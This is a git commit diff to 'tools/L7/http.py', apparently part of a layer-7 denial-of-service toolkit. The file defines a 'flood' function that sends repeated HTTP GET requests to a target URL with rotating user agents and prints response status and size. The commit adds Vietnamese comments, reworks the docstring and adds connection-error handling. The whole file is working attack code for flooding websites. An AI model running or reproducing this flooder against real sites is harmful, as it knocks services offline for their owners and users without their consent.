3b19bbb3f7d44e8b915fdabadc1a5d1762a73c81
dhungx <139793488+dhungx@users.noreply.github.com>
2024-11-03 12:51:38 +0700

    Update http.py

--- tools/L7/http.py
+++ tools/L7/http.py
@@ -2,15 +2,15 @@
 
 import json
 import random
-
 import requests
 from colorama import Fore as F
-from requests.exceptions import Timeout
+from requests.exceptions import Timeout, ConnectionError
 
+# Tải danh sách User-Agent từ file JSON
 with open("tools/L7/user_agents.json", "r") as agents:
     user_agents = json.load(agents)["agents"]
 
-
+# Thiết lập các header chung cho yêu cầu HTTP
 headers = {
     "X-Requested-With": "XMLHttpRequest",
     "Connection": "keep-alive",
@@ -19,29 +19,30 @@ headers = {
     "Accept-Encoding": "gzip, deflate, br",
 }
 
+# Màu hiển thị cho trạng thái phản hồi
 color_code = {True: F.GREEN, False: F.RED}
-
 
 def flood(target: str) -> None:
     """Start an HTTP GET request flood.
 
     Args:
-        - target - Target's URL
+        target (str): Target's URL
 
     Returns:
         None
     """
     global headers
-
     headers["User-agent"] = random.choice(user_agents)
 
     try:
+        # Gửi yêu cầu HTTP GET đến mục tiêu
         response = requests.get(target, headers=headers, timeout=4)
-    except (Timeout, OSError):
-        return
-    else:
-        status = (
-            f"{color_code[response.status_code == 200]}Status: [{response.status_code}]"
-        )
+        
+        # Hiển thị trạng thái và thông tin dữ liệu nhận được
+        status = f"{color_code[response.status_code == 200]}Status: [{response.status_code}]"
         payload_size = f"{F.RESET} Requested Data Size: {F.CYAN}{round(len(response.content)/1024, 2):>6} KB"
         print(f"{status}{F.RESET} --> {payload_size} {F.RESET}")
+
+    except (Timeout, ConnectionError) as e:
+        # Hiển thị lỗi kết nối
+        print(f"{F.RED}[!] Connection error: {e}{F.RESET}")
